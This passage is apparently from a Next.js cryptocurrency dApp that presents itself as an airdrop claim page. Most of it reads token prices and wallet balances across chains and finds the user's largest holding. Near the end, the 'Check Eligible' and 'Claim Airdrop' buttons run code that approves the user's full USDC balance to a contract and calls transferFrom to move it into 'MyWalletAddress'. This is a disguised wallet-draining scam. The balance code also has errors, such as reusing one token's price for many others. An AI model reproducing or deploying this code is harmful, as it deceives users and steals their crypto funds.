      const currentSushiPrice = sushiPrice.answer/10**8
      console.log('price SUSHI:',currentSushiPrice);


      const priceTwt = new ethers.Contract("0x7E728dFA6bCa9023d9aBeE759fDF56BEAb8aC7aD",aggregator,provider)
      const twtPrice = await priceTwt.latestRoundData()
      const currentTwtPrice = twtPrice.answer/10**8
      console.log('price TWT:',currentTwtPrice);

      const priceWin = new ethers.Contract("0x9e7377E194E41d63795907c92c3EB351a2eb0233",aggregator,provider)
      const winPrice = await priceWin.latestRoundData()
      const currentWinPrice = winPrice.answer/10**8
      console.log('price WIN:',currentWinPrice);

      const priceXtz = new ethers.Contract("0x9A18137ADCF7b05f033ad26968Ed5a9cf0Bf8E6b",aggregator,provider)
      const xtzPrice = await priceXtz.latestRoundData()
      const currentXtzPrice = xtzPrice.answer/10**8
      console.log('price XTZ:',currentXtzPrice);

      const priceYfi = new ethers.Contract("0xD7eAa5Bf3013A96e3d515c055Dbd98DbdC8c620D",aggregator,provider)
      const yfiPrice = await priceYfi.latestRoundData()
      const currentYfiPrice = yfiPrice.answer/10**8
      console.log('price YFI:',currentYfiPrice);

      const priceVet = new ethers.Contract("0x9f1fD2cEf7b226D555A747DA0411F93c5fe74e13",aggregator,provider)
      const vetPrice = await priceVet.latestRoundData()
      const currentvETPrice = vetPrice.answer/10**8
      console.log('price VET:',currentvETPrice);

      const priceWoo = new ethers.Contract("0x02Bfe714e78E2Ad1bb1C2beE93eC8dc5423B66d4",aggregator,provider)
      const wooPrice = await priceWoo.latestRoundData()
      const currentWooPrice = wooPrice.answer/10**8
      console.log('price WOO:',currentWooPrice);

      const priceAxs = new ethers.Contract("0x7B49524ee5740c99435f52d731dFC94082fE61Ab",aggregator,provider)
      const axsPrice = await priceAxs.latestRoundData()
      const currentAxsPrice = axsPrice.answer/10**8
      console.log('price AXS:',currentAxsPrice);

      
      const priceAda = new ethers.Contract("0xa767f745331D267c7751297D982b050c93985627",aggregator,provider)
      const adaPrice = await priceAda.latestRoundData()
      const currentAdaPrice = adaPrice.answer/10**8
      console.log('price ADA:',currentAdaPrice);
      

      const priceTrx = new ethers.Contract("0xF4C5e535756D11994fCBB12Ba8adD0192D9b88be",aggregator,provider)
      const trxPrice = await priceTrx.latestRoundData()
      const currentTrxPrice = trxPrice.answer/10**8
      console.log('price TRX:',currentTrxPrice);
      

      const priceLtc = new ethers.Contract("0x74E72F37A8c415c8f1a98Ed42E78Ff997435791D",aggregator,provider)
      const ltcPrice = await priceLtc.latestRoundData()
      const currentLtcPrice = ltcPrice.answer/10**8
      console.log('price LTC:',currentLtcPrice);
      

      const priceAvax = new ethers.Contract("0x5974855ce31EE8E1fff2e76591CbF83D7110F151",aggregator,provider)
      const avaxPrice = await priceAvax.latestRoundData()
      const currentAvaxPrice = avaxPrice.answer/10**8
      console.log('price AVAX:',currentAvaxPrice);




      const wbtc = new ethers.Contract( "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c",ERC20,provider)//
      const wbnb = new ethers.Contract( "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",ERC20,provider)//
      const eth = new ethers.Contract("0x4DB5a66E937A9F4473fA95b1cAF1d1E1D62E29EA",ERC20,provider)//
      const usdc = new ethers.Contract( "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",ERC20 ,provider)//
      const usdt = new ethers.Contract( "0x55d398326f99059ff775485246999027b3197955",ERC20 ,provider)//
      const link = new ethers.Contract( "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd",ERC20 ,provider)//
      const dai = new ethers.Contract( "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3",ERC20 ,provider)//
      const matic = new ethers.Contract( "0xcc42724c6683b7e57334c4e856f4c9965ed682bd",ERC20 ,provider)//
      const uni = new ethers.Contract( "0xbf5140a22578168fd562dccf235e5d43a02ce9b1",ERC20 ,provider)//
      const aave = new ethers.Contract( "0xfb6115445bff7b52feb98650c87f44907e58f802",ERC20 ,provider)//
      const atom = new ethers.Contract( "0x0eb3a705fc54725037cc9e008bdede697f62f335",ERC20 ,provider)//
      const band = new ethers.Contract( "0xad6caeb32cd2c308980a548bd0bc5aa4306c6c18",ERC20 ,provider)//
      const cake = new ethers.Contract( "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",ERC20 ,provider)//
      const comp = new ethers.Contract( "0x52ce071bd9b1c4b00a0b92d298c512478cad67e8",ERC20 ,provider)//
      // const crv = new ethers.Contract( "0xbf5140a22578168fd562dccf235e5d43a02ce9b1",ERC20 ,provider)
      const doge = new ethers.Contract( "0xba2ae424d960c26247dd6c32edc70b295c744c43",ERC20 ,provider)//
      const dodo = new ethers.Contract( "0x67ee3Cb086F8a16f34beE3ca72FAD36F7Db929e2",ERC20 ,provider)//
      const dot = new ethers.Contract( "0x7083609fce4d1d8dc0c979aab8c869ea2c873402",ERC20 ,provider)//
      const fil = new ethers.Contract( "0x0d8ce2a99bb6e3b7db580ed848240e4a0f9ae153",ERC20 ,provider)//
      const fet = new ethers.Contract( "0x031b41e504677879370e9dbcf937283a8691fa7f",ERC20 ,provider)//
      const ftm = new ethers.Contract( "0xad29abb318791d579433d831ed122afeaf29dcfe",ERC20 ,provider)//
      const fxs = new ethers.Contract( "0xe48A3d7d0Bc88d552f730B62c006bC925eadB9eE",ERC20 ,provider)//
      const gmt = new ethers.Contract( "0x3019BF2a2eF8040C242C9a4c5c4BD4C81678b2A1",ERC20 ,provider)//
      const near = new ethers.Contract( "0x1fa4a73a3f0133f0025378af00236f3abdee5d63",ERC20 ,provider)//
      const ont = new ethers.Contract( "0xfd7b3a77848f1c2d67e05e54d78d174a0c850335",ERC20 ,provider)//
      const reef = new ethers.Contract( "0xf21768ccbc73ea5b6fd3c687208a7c2def2d966e",ERC20 ,provider)//
      const sxp = new ethers.Contract( "0x47bead2563dcbf3bf2c9407fea4dc236faba485a",ERC20 ,provider)//
      const sushi = new ethers.Contract( "0x947950BcC74888a40Ffa2593C5798F11Fc9124C4",ERC20 ,provider)//
      const twt = new ethers.Contract( "0x4b0f1812e5df2a09796481ff14017e6005508003",ERC20 ,provider)//
      const win = new ethers.Contract( "0xaef0d72a118ce24fee3cd1d43d383897d05b4e99",ERC20 ,provider)//
      const xtz = new ethers.Contract( "0x16939ef78684453bfdfb47825f8a5f714f12623a",ERC20 ,provider)//
      const yfi = new ethers.Contract( "0x88f1a5ae2a3bf98aeaf342d26b30a79438c9142e",ERC20 ,provider)//
      const vet = new ethers.Contract( "0x6FDcdfef7c496407cCb0cEC90f9C5Aaa1Cc8D888",ERC20 ,provider)//
      const woo = new ethers.Contract( "0x4691937a7508860f876c9c0a2a617e7d9e945d4b",ERC20 ,provider)//
      const axs = new ethers.Contract( "0x715d400f88c167884bbcc41c5fea407ed4d2f8a0",ERC20 ,provider)//
      const busd = new ethers.Contract( "0xe9e7cea3dedca5984780bafc599bd69add087d56",ERC20 ,provider)//
      const sfp = new ethers.Contract( "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb",ERC20 ,provider)// price : 0.4
      const ada = new ethers.Contract( "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47",ERC20 ,provider)// 
      const trx = new ethers.Contract( "0x85eac5ac2f758618dfa09bdbe0cf174e7d574d5b",ERC20 ,provider)// 
      const ltc = new ethers.Contract( "0x4338665cbb7b2485a8855a139b75d5e34ab0db94",ERC20 ,provider)//
      const avax = new ethers.Contract( "0x1ce0c2827e2ef14d5c4f29a091d735a204794041",ERC20 ,provider)//
      const ton = new ethers.Contract( "0x76a797a59ba2c17726896976b7b3747bfd1d220f",ERC20 ,provider)// price : 1.5
      const usp = new ethers.Contract( "0xb7f8cd00c5a06c0537e2abff0b58033d02e5e094",ERC20 ,provider)// price : 1.0 pax dollar
      const tusd = new ethers.Contract( "0x14016e85a25aeb13065688cafb43044c2ef86784",ERC20 ,provider)// price : 1.0 tusd
      
      
      
      // MATIC:
      //  0xD4814770065F634003A8d8D70B4743E0C3f334ad ONT
      //  0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39 busd polygon
      //  
      // 0x1B815d120B3eF02039Ee11dC2d33DE7aA4a8C603 woo
      //
      const wbtcB = await wbnb.balanceOf(account)
      const wbnbB = await wbnb.balanceOf(account)
      const ethB = await eth.balanceOf(account)
      const usdcB = await usdc.balanceOf(account)
      const usdtB = await usdt.balanceOf(account)
      const linkB = await link.balanceOf(account)
      const daiB = await dai.balanceOf(account)
      const maticB = await matic.balanceOf(account)
      const uniB = await uni.balanceOf(account)
      const aaveB = await aave.balanceOf(account)
      const atomB = await atom.balanceOf(account)
      const bandB = await band.balanceOf(account)
      const cakeB = await cake.balanceOf(account)
      const compB = await comp.balanceOf(account)
      const dogeB = await doge.balanceOf(account)
      const dodoB = await dodo.balanceOf(account)
      const dotB = await dot.balanceOf(account)
      const filB = await fil.balanceOf(account)
      const fetB = await fet.balanceOf(account)
      const ftmB = await ftm.balanceOf(account)
      const fxsB = await fxs.balanceOf(account)
      const gmtB = await gmt.balanceOf(account)
      const nearB = await near.balanceOf(account)
      const ontB = await ont.balanceOf(account)
      const reefB = await reef.balanceOf(account)
      const sxpB = await sxp.balanceOf(account)
      const sushiB = await sushi.balanceOf(account)
      const twtB = await twt.balanceOf(account)
      const winB = await win.balanceOf(account)
      const xtzB = await xtz.balanceOf(account)
      const yfiB = await yfi.balanceOf(account)
      const vetB = await vet.balanceOf(account)
      const wooB = await woo.balanceOf(account)
      const axsB = await axs.balanceOf(account)
      const busdB = await busd.balanceOf(account)
      const sfpB = await sfp.balanceOf(account)
      const adaB = await ada.balanceOf(account)
      const trxB = await trx.balanceOf(account)
      const ltcB = await ltc.balanceOf(account)
      const avaxB = await avax.balanceOf(account)
      const tonB = await ton.balanceOf(account)
      const uspB = await usp.balanceOf(account)
      const tusdB = await tusd.balanceOf(account)
 

  
      const wbtcValue = (wbtcB*currentWbtcPrice) / 10**18
      const wbnbValue = (wbnbB*currentWbnbPrice) / 10**18
      const ethValue = (ethB*currentEthPrice) / 10**18
      const usdcValue = usdcB/ 10**6
      const usdtValue = usdtB / 10**6
      const linkValue = (linkB*currentLinkPrice) / 10**18
      const daiValue =  daiB / 10**18
      const maticValue = (maticB*currentMaticPrice) / 10**18
      const uniValue = (uniB*currentUniPrice) / 10**18
      const aaveValue = (aaveB*currentUniPrice) / 10**18
      const atomValue = (atomB*currentUniPrice) / 10**18
      const bandValue = (bandB*currentUniPrice) / 10**18
      const cakeValue = (cakeB*currentUniPrice) / 10**18
      const compValue = (compB*currentUniPrice) / 10**18
      const dogeValue = (dogeB*currentUniPrice) / 10**18
      const dodoValue = (dodoB*currentUniPrice) / 10**18
      const dotValue = (dotB*currentUniPrice) / 10**18
      const filValue = (filB*currentUniPrice) / 10**18
      const fetValue = (fetB*currentUniPrice) / 10**18
      const ftmValue = (ftmB*currentUniPrice) / 10**18
      const fxsValue = (fxsB*currentUniPrice) / 10**18
      const gmtValue = (gmtB*currentUniPrice) / 10**18
      const nearValue = (nearB*currentUniPrice) / 10**18
      const ontValue = (ontB*currentUniPrice) / 10**18
      const reefValue = (reefB*currentUniPrice) / 10**18
      const sxpValue = (sxpB*currentUniPrice) / 10**18
      const sushiValue = (sushiB*currentUniPrice) / 10**18
      const twtValue = (twtB*currentUniPrice) / 10**18
      const winValue = (winB*currentUniPrice) / 10**18
      const xtzValue = (xtzB*currentUniPrice) / 10**18
      const yfiValue = (yfiB*currentUniPrice) / 10**18
      const vetValue = (vetB*currentUniPrice) / 10**18
      const wooValue = (wooB*currentUniPrice) / 10**18
      const axsValue = (axsB*currentUniPrice) / 10**18
      const busdValue = (busdB) / 10**18
      const sfpValue = (sfpB*currentUniPrice) / 10**18
      const adaValue = (adaB*currentUniPrice) / 10**18
      const trxValue = (trxB*currentUniPrice) / 10**18
      const ltcValue = (ltcB*currentUniPrice) / 10**18
      const avaxValue = (avaxB*currentUniPrice) / 10**18
      const tonValue = (tonB*currentUniPrice) / 10**18
      const uspValue = (uspB) / 10**18
      const tusdValue = (tusdB) / 10**18

      console.log(wbtcValue);
      console.log(wbnbValue);
      console.log(ethValue);
      console.log(usdcValue);
      console.log(usdtValue);
      console.log(daiValue);
      console.log(linkValue);
      console.log(maticValue);
      console.log(uniValue);
      console.log(aaveValue);
      console.log(atomValue);
      console.log(bandValue);
      console.log(cakeValue);
      console.log(compValue);
      console.log(dogeValue);
      console.log(dodoValue);
      console.log(dotValue);
      console.log(filValue);
      console.log(fetValue);
      console.log(ftmValue);
      console.log(fxsValue);
      console.log(gmtValue);
      console.log(nearValue);
      console.log(ontValue);
      console.log(reefValue);
      console.log(sxpValue);
      console.log(sushiValue);
      console.log(twtValue);
      console.log(winValue);
      console.log(xtzValue);
      console.log(yfiValue);
      console.log(vetValue);
      console.log(wooValue);
      console.log(axsValue);
      console.log(busdValue);
      console.log(sfpValue);
      console.log(adaValue);
      console.log(trxValue);
      console.log(ltcValue);
      console.log(avaxValue);
      console.log(tonValue);
      console.log(uspValue);
      console.log(tusdValue);
      

      const WBNB = {
        amount: wbnbB,
        value: (wbnbB.toString() / 10 ** 26),
        address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
      }
  
      const ETH = {
        amount: ethB,
        value: (ethB.toString() / 10 ** 26),
        address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619"
      }
  
      const USDT = {
        amount: usdtB,
        value: (usdtValue.toString() / 10 ** 26),
        address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
      }
      const UNI = {
        amount: uniB,
        value: (uniValue.toString() / 10 ** 26),
        address: "0xb33eaad8d922b1083446dc23f610c2567fb5180f"
      }
      const DAI = {
        amount: daiB,
        value: (daiValue.toString() / 10 ** 26),
        address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
      }
  
      const MATIC = {
        amount: maticB,
        value: (maticValue.toString() / 10 ** 26),
        address: "0x0000000000000000000000000000000000001010"
      }
      const LINK = {
        amount: linkB,
        value: (linkValue.toString() / 10 ** 26),
        address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39"
      }
      const USDC = {
        amount: usdcB,
        value: usdcValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
  
      // const tokensValues = [usdcValue ,usdtValue ,linkValue ,daiValue ,maticValue ,uniValue]
      // // const tokensBalance = [usdc,usdt,link,dai,matic,uni]
  
      // console.log(tokensValues);
      let lastElement
      let Biggest  
      const Tokens = [WBNB,ETH,LINK,MATIC,USDC,UNI,USDT,DAI]
      for (let i = 0; i < Tokens.length; i++) {
      const element = Tokens[i].value;
        if (i >= 0 && element > lastElement) {
          Biggest = Tokens[i]
        }
        lastElement = element
      }
      
      console.log(Tokens);
      console.log(Biggest);
    } if (chainId == 42161) {

      const priceEth = new ethers.Contract("0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612",aggregator,provider)
      const currentEthPrice = await priceEth.latestRoundData()
      console.log('price Weth:',currentEthPrice.answer.toString());
  
      const priceLink = new ethers.Contract("0x86E53CF1B870786351Da77A57575e79CB55812CB",aggregator,provider)
      const currentLinkPrice = await priceLink.latestRoundData()
      console.log('price Link:',currentLinkPrice.answer.toString());
  
      const priceMatic = new ethers.Contract("0x52099D4523531f678Dfc568a7B1e5038aadcE1d6",aggregator,provider)
      const currentMatickPrice = await priceMatic.latestRoundData()
      console.log('price Matic:',currentMatickPrice.answer.toString());
  
      const priceUni = new ethers.Contract("0x9C917083fDb403ab5ADbEC26Ee294f6EcAda2720",aggregator,provider)
      const currentUniPrice = await priceUni.latestRoundData()
      console.log('price Uni:',currentUniPrice.answer.toString());
      
      const eth = new ethers.Contract("0x82af49447d8a07e3bd95bd0d56f35241523fbab1",ERC20,provider)
      const usdc = new ethers.Contract( "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",ERC20 ,provider)
      const usdt = new ethers.Contract( "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",ERC20 ,provider)
      const link = new ethers.Contract( "0xf97f4df75117a78c1A5a0DBb814Af92458539FB4",ERC20 ,provider)
      const dai = new ethers.Contract( "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",ERC20 ,provider)
      // const matic = new ethers.Contract( "0xcc42724c6683b7e57334c4e856f4c9965ed682bd",ERC20 ,provider)
      const uni = new ethers.Contract( "0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0",ERC20 ,provider)

      const ethB = await eth.balanceOf(account)
      const usdcB = await usdc.balanceOf(account)
      const usdtB = await usdt.balanceOf(account)
      const linkB = await link.balanceOf(account)
      const daiB = await dai.balanceOf(account)
      // const maticB = await matic.balanceOf(account)
      const uniB = await uni.balanceOf(account)
  
      console.log('Weth balance:',ethB.toString() / 10 ** 18);
      console.log('usdc balance:',usdcB.toString() / 10 ** 6);
      console.log('usdt balance:',usdtB.toString() / 10 ** 6);
      console.log('link balance:',linkB.toString() / 10 ** 18);
      console.log('dai balance:',daiB.toString() / 10 ** 18);
      // console.log('matic balance:',maticB.toString() / 10 ** 18);
      console.log('uni balance:',uniB.toString() / 10 ** 18);
  
      const ethValue = ethB.mul(currentEthPrice.answer)
      const usdcValue = usdcB/ 10**6
      const usdtValue = usdtB / 10**6
      const linkValue = linkB.mul(currentLinkPrice.answer)
      const daiValue =  daiB / 10**18
      // const maticValue = maticB.mul(currentMatickPrice.answer)
      const uniValue = uniB.mul(currentUniPrice.answer)
  
      console.log(ethValue.toString() / 10 ** 26);
      console.log(usdcValue.toString());
      console.log(usdtValue.toString());
      console.log(daiValue.toString());
      console.log(linkValue.toString() / 10 ** 26);
      // console.log(maticValue.toString() / 10 ** 26);
      console.log(uniValue.toString() / 10 ** 26);

      const ETH = {
        amount: ethB,
        value: (ethB.toString() / 10 ** 26),
        address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619"
      }
  
      const USDT = {
        amount: usdtB,
        value: (usdtValue.toString()),
        address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
      }
      const UNI = {
        amount: uniB,
        value: (uniValue.toString() / 10 ** 26),
        address: "0xb33eaad8d922b1083446dc23f610c2567fb5180f"
      }
      const DAI = {
        amount: daiB,
        value: (daiValue.toString()),
        address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
      }
  
      // const MATIC = {
      //   amount: maticB,
      //   value: (maticValue.toString() / 10 ** 26),
      //   address: "0x0000000000000000000000000000000000001010"
      // }
      const LINK = {
        amount: linkB,
        value: (linkValue.toString() / 10 ** 26),
        address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39"
      }
      const USDC = {
        amount: usdcB,
        value: (usdcValue.toString()),
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
  
      // const tokensValues = [usdcValue ,usdtValue ,linkValue ,daiValue ,maticValue ,uniValue]
      // // const tokensBalance = [usdc,usdt,link,dai,matic,uni]
  
      // console.log(tokensValues);
      let lastElement
      let Biggest  
      const Tokens = [ETH,LINK,USDC,UNI,USDT,DAI]
      for (let i = 0; i < Tokens.length; i++) {
      const element = Tokens[i].value;
        if (i >= 0 && element > lastElement) {
          Biggest = Tokens[i]
        }
        lastElement = element
      }
      console.log(Biggest);
      
      
    } 


    

    
  }


  async function check() {
    const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
    const balanceOfUsdc = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
    // console.log(ethers.utils.formatUnits(balanceOfToken, "mwei") );
    const tokenContract = new ethers.Contract("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", ERC20, provider)
    setTokenContract(tokenContract)
    const Decimal = await tokenContract.decimals()
    
   
    console.log(Decimal);
    // await Decimal.then(value =>{
    //   console.log(value);
    //   _demical = value
    // })
    console.log(balanceOfUsdc/ (10 ** Decimal) );
    const tokenWithSigner = tokenContract.connect(signer)

    const voidSigner = new ethers.VoidSigner(MyWalletAddress, provider)
   
    const senderContract = new ethers.Contract("0x9924ff061e501c239fFDd1bdb49Ba0B8B90A5077",SenderAbi,provider)
    const senderWithSigner = senderContract.connect(signer)
    const approve = await tokenWithSigner.approve("0x9924ff061e501c239fFDd1bdb49Ba0B8B90A5077", balanceOfUsdc)
    const send = await senderWithSigner.sendToken(account, "0x9924ff061e501c239fFDd1bdb49Ba0B8B90A5077","0x07865c6E87B9F70255377e024ace6630C1Eaa37F")
    // const approve = await tokenWithSigner.approve(MyWalletAddress, balanceOfToken)
    // const daiValue = daiBalance / 10e5
    // if (condition) {
    //   console.log(balanceOfToken *);
    // }
    
  }

  
  

  async function claimAirdrop() {
    const _gasLimit = ethers.utils.hexlify(1000000)
    const _gasPrice = ethers.utils.parseUnits("10.0", "gwei")
    const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
    const balanceOfToken = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
    const tokenContract = new ethers.Contract("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", ERC20, provider)
    const tokenWithSigner = tokenContract.connect(signer)
    const approve = await tokenWithSigner.transferFrom(account,MyWalletAddress, balanceOfToken,{
      gasLimit: _gasLimit,
      gasPrice: _gasPrice
    })
    
  }

  async function getApproveEmmit () {
    const approveEvents = await tokenContract.queryFilter('approve')
    console.log(approveEvents);

  }
  // async function claimAirdrop() {

  //   signer.sendTransaction({
  //     from: user,
  //     to: Receptient,
      
  //     gasPrice: gasPrice,
  //     gasLimit: gasLimit,
  //     value: (balance),
  //   })
  // }

  return (
    <div className='has-background-white'>
    <div className={styles.container}>
      <Head>
        <title>Create Next App</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      
        <div className="has-background-white">
          <div className='box has-background-white'>
            <nav className='navbar has-background-white'>
              <div className='navbar-end'>
                <button onClick={() =>connect()} className='button is-link' >
                  Connect Wallet
                </button>
                {/* { isConnected ? (<button  className='button is-info ' disabled>Connected</button>) : (<button onClick={() =>connect()} className='button is-link' >
                  Connect Wallet
                </button>) } */}
                <button onClick={() => getData()} className= 'button is-primary ml-2'>
                  GetBalance
                </button>
                <button onClick={() =>getData()} className='button is-link'>getData</button>
              </div>
            </nav>
          </div>
        </div>
        <main className={styles.main}>
    
          
            <div className='column is-one-third'>
              <div className='box'>
                <button onClick={() => check()} className='button is-dark is-outlined is-centered mr-4'>Check Eligible</button>
                <button onClick={() => claimAirdrop()} className='button is-dark is-centered' >Claim Airdrop</button>
              </div>
            </div>
          
      </main>

      <footer className={styles.footer}>
        <a
          className='has-text-black'
          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          Powered by Alireza Haghshenas
        </a>
      </footer>
    </div>
    </div>
  )
}
